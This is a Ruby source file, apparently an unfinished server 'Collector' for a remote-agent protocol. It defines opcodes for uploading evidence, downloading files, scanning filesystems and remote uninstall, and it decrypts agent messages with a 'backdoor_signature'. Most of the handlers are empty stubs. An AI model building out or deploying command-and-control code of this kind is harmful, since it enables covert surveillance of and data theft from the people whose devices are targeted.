#
#  The Synchronization REST Protocol
#

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/crypt'
require 'rcs-common/pascalize'

# system
require 'securerandom'

module RCS
module Collector

class Protocol
  extend RCS::Tracer
  extend RCS::Crypt

  INVALID_COMMAND  = 0x00       # Don't use
  PROTO_OK         = 0x01       # OK
  PROTO_NO         = 0x02       # Nothing available
  PROTO_BYE        = 0x03       # The end of the protocol
  PROTO_CHALLENGE  = 0x04       # Authentication
  PROTO_ID         = 0x0f       # Identification of the target
  PROTO_CONF       = 0x07       # New configuration
  PROTO_UNINSTALL  = 0x0a       # Uninstall command
  PROTO_DOWNLOAD   = 0x0c       # List of files to be downloaded
  PROTO_UPLOAD     = 0x0d       # A file to be saved
  PROTO_EVIDENCE   = 0x09       # Upload of a log
  PROTO_FILESYSTEM = 0x19       # List of paths to be scanned

  # the commands are depicted here: http://rcs-dev/trac/wiki/RCS_Sync_Proto_Rest

  # Authentication phase
  # ->  Crypt_C ( Kd, NonceDevice, BuildId, InstanceId, SubType, sha1 ( BuildId, InstanceId, SubType, Cb ) )
  # <-  [ Crypt_C ( Ks ), Crypt_K ( NonceDevice, Response ) ]  |  SetCookie ( SessionCookie )
  def self.authenticate(peer, uri, cookie, content)
    trace :info, "[#{peer}] Authentication required..."

    # decrypt the message with the per customer signature
    message = aes_decrypt(content, DB.instance.backdoor_signature)

    # first part of the session key, choosen by the client
    # it will be used to derive the session key later along with Ks (server choosen)
    # and the Cb (preshared conf key)
    kd = message[0..15]
    trace :debug, "[#{peer}] Auth -- Kd: " << kd.unpack('H*').to_s

    # the client NOnce that has to be returned by the server
    # this is used to authenticate the server
    # returning it crypted with the session key it will confirm the
    # authenticity of the server
    nonce = message[16..31]
    trace :debug, "[#{peer}] Auth -- Nonce: " << nonce.unpack('H*').to_s

    # the build_id identification
    build_id = message[32..47]
    trace :debug, "[#{peer}] Auth -- BuildId: " << build_id

    # instance of the device
    instance_id = message[48..67]
    trace :debug, "[#{peer}] Auth -- InstanceId: " << instance_id.unpack('H*').to_s

    # subtype of the device
    subtype = message[68..83]
    trace :debug, "[#{peer}] Auth -- subtype: " << subtype

    sha = message[84..-1]

    ks = SecureRandom.random_bytes(16)

    return 
  end

  def self.valid_authentication(peer, cookie)
    # code here
  end

  def self.commands(peer, cookie, content)
    trace :debug, "COMMANDS"
    return
  end

  # the protocol is parsed here
  # there are only two phases:
  #   - Authentication
  #   - Commands
  def self.parse(peer, uri, cookie, content)

    # if the request does not contains any cookies,
    # we need to perform authentication first
    return authenticate(peer, uri, cookie, content) if cookie.nil?

    # we have a cookie, check if it's valid
    return unless valid_authentication(peer, cookie)

    # the agent has been authenticated, parse the commands it sends
    return commands(peer, cookie, content)
  end


end #Protocol

end #Collector::
end #RCS::